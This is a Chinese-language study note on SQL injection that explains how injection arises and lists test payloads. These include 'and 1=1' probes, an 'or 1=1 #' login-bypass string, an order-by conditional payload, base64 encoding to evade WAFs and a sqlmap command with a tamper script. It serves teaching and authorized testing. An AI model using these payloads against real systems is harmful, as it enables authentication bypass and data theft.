# 规范:
注入漏洞，只要证明可以读取数据就行，严禁读取表内数据。对于UPDATE、DELETE、 INSERT等注入类型，不允许使用自动化工具进行测试。

# sql 注入产生关键点

1. 用户提交的数据内容被带入到
2. 程序没有对用户提交内容作合理的处理, 导致用户可以改变原有sql语义或添加额外的sql语句
```
# 正常的sql语句
select * from table where id = 2

# 改造后的sql语句
select * from table where id = 2 and 1=1
```
> 可以看到 and 1= 1 不是原来就有的, 而是人为添加的, 所以最终查询会多执行 `**and 1=1 **`
> 这一下段语句


# sql 注入url样例
```
http://www.test.com/news/id/1111.html 
```
> 虽然最后查询的是1111.html , 但这个大概率含有sql注入, 这里用的是返回静态页面, 最终**1111.html 也会被带到数据库**中进行查询, 返回带有信息的 html 的静态界面, 有 web服务器通过**rewrite 来将其转变为正常的查询**从而导致大量信息泄露


```
.http://www.test.com/news.php?id=1111
```
> 这就是一个很常见的sql 注入, 用 `**?id = 1111**`**, **正常的在url中查询某个参数.
> 千万不要忘记 `**?**`** **, 查询参数必须要有 `**?**`


# sql 注入测试
> 要想看到到底有没有sql 注入点, 可以通过输入一些sql 语句, 根据返回的结果进行判断

```

# 1. 整型,  111-0 = 111 , 所以下面查询的id=111
id = 111-0                    


# 2. 字符型, 下面的 单引号 ' 用于闭合,   # 井号 表示注释, 卸载# 后的内容都不会执行
username = zhangsan' and 1=1 # 与username = zhangsan' and 1=1#      


# 3. 搜索型, 还是通过 and 1=1 来判断是否被带入到数据库中执行,     
word = a%' and 1=1 #                与 word a%' and 1=2#    

# 万能密码, 用户名输入下面的东西, 密码随便输入,都能成功输入, 但是万能密码只能填到账号那里
# 因为万能密码的原理就是通过 # 来说注释掉后面密码的校验.所以万能密码并不唯一, 看个人怎么构造
'or 1=1 #


# 4. order by , 预编译对order by 是不起作用的, 因为与便于将输入的位置固定, 但是输入的内容
都会被转化为字符型, 也就是加引号, 而 order by就是 按照列进行排序, 要求不能加引号,所以不影响order by
# 升序用asc      降序用desc

拓展: 预编译对于sql语句中的 表名和列名也是无效的

order by if((1=1),1,(select 1 union select 2) asc     

# 5. 通过 in 查询多个参数 , 这种类型的, 通常url 会有 ids  这个字样.
select * from table where id  in (1,3) and 1=2 #);


# 6. 参数对应的value加密, 最常见的是base64加密,  waf 不会进行这样的拦截, 所以这个优势很大.
    	# 下面的 test_param 对应的value加密的了
http://192.168.31.103/sql_base64.php?test_param=bGlsaQ%3D%3D

步骤: 1. 向进行url解码,  在进行一次base64解码
    2. 注入语句先进行base64加密, 然后, 将加密后末尾出现的 == 改为url类型, 即  %3D


手动的太麻烦, 用sqlmap, 依次输入: 
sqlmap
python sqlmap.py -u 想要查询的url  -p test_param --tamper base64encode.py
```
考虑 大小写
绕过等号 用 like

